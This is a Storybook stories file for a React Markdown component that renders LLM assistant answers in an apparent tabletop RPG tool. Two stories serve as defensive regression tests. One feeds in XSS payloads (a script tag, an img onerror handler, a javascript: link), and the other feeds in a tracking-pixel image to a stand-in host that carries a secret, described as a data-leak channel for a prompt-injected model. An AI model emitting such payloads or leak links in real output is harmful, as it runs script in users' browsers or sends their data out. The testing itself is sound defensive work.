/**
 * Markdown — the renderer every assistant answer passes through.
 *
 * The stories that matter here are the nasty ones: this component takes LLM
 * output, which is attacker-reachable through the corpus and the prompt, and
 * hands it to `dangerouslySetInnerHTML`. `Sanitized` and `CampaignAssetsOnly`
 * are the visual half of the regression suite in `Markdown.test.tsx`.
 */
import type { Meta, StoryObj } from '@storybook/react-vite'
import { expect, within } from 'storybook/test'

import { Markdown } from './Markdown'

const ANSWER = `A **shield** spell is cast as a reaction, and it is worth the slot.

- +5 bonus to AC, including against the triggering attack
- Lasts until the start of your next turn
- Blocks *magic missile* outright

> "An invisible barrier of magical force appears and protects you."

See the [Player's Handbook](https://example.invalid/phb) for the full text.`

const TABLE = `| Level | Proficiency | Features |
| --- | --- | --- |
| 1 | +2 | Rage, Unarmoured Defence |
| 2 | +2 | Reckless Attack, Danger Sense |
| 3 | +2 | Primal Path |

Inline \`code\` and a fenced block:

\`\`\`text
1d8 + 3 slashing
\`\`\``

const LONG = Array.from(
  { length: 14 },
  (_, i) =>
    `### Section ${i + 1}\n\nThe corridor turns again. Damp stone, a smell of old iron, and somewhere ahead the sound of water moving where no water should be. ${'The torchlight does not reach the ceiling. '.repeat(3)}`,
).join('\n\n')

const meta = {
  title: 'Shell/Markdown',
  component: Markdown,
  tags: ['autodocs'],
  parameters: { layout: 'padded' },
  args: { source: ANSWER },
} satisfies Meta<typeof Markdown>

export default meta
type Story = StoryObj<typeof meta>

export const Playground: Story = {}

/** GFM tables and code come free with `marked`; no plugin, no extra packages. */
export const TablesAndCode: Story = {
  args: { source: TABLE },
}

/** An answer far longer than the viewport — the reading measure has to hold. */
export const LongAnswer: Story = {
  args: { source: LONG },
}

/** The empty answer. Renders an empty container, never `undefined` or a crash. */
export const Empty: Story = {
  args: { source: '' },
  play: async ({ canvasElement }) => {
    const host = canvasElement.querySelector('.aether-markdown')
    await expect(host).toBeInTheDocument()
    await expect(host).toBeEmptyDOMElement()
  },
}

/**
 * Hostile model output. The script tag, the inline handler and the
 * `javascript:` href are all gone; the visible prose survives.
 */
export const Sanitized: Story = {
  args: {
    source: [
      'A perfectly ordinary answer.',
      '',
      '<script>window.__pwned = true</script>',
      // The alt text is part of the fixture, not of the defence: DOMPurify
      // keeps a model-authored <img>, and an alt-less one would be an
      // image-alt violation THIS story introduced rather than one the
      // component has. Tracked separately — see the bead note in the PR.
      '<img src=x alt="a broken image" onerror="window.__pwned = true">',
      '',
      '[Click me](javascript:window.__pwned=true)',
    ].join('\n'),
  },
  play: async ({ canvasElement }) => {
    const canvas = within(canvasElement)
    await expect(canvas.getByText(/perfectly ordinary answer/)).toBeInTheDocument()
    await expect(canvasElement.querySelector('script')).toBeNull()
    await expect(canvasElement.querySelector('[onerror]')).toBeNull()
    const link = canvasElement.querySelector('a')
    await expect(link?.getAttribute('href') ?? '').not.toMatch(/^javascript:/i)
  },
}

/**
 * Decision X-10, the Workbench setting: a remote image is an exfiltration
 * channel for a steered model, so nothing here may fetch anything by itself.
 * Only a campaign asset on this origin survives.
 */
export const CampaignAssetsOnly: Story = {
  args: {
    noRemoteSubresources: true,
    source: [
      'The portrait the GM asked for:',
      '',
      '![a hooded figure](https://tracker.invalid/pixel?secret=abc)',
      '',
      '<iframe src="https://tracker.invalid/frame"></iframe>',
    ].join('\n'),
  },
  play: async ({ canvasElement }) => {
    await expect(canvasElement.querySelector('img')).toBeNull()
    await expect(canvasElement.querySelector('iframe')).toBeNull()
  },
}

export const Dark: Story = {
  globals: { theme: 'dark' },
  args: { source: ANSWER },
}

export const DarkTablesAndCode: Story = {
  globals: { theme: 'dark' },
  args: { source: TABLE },
}
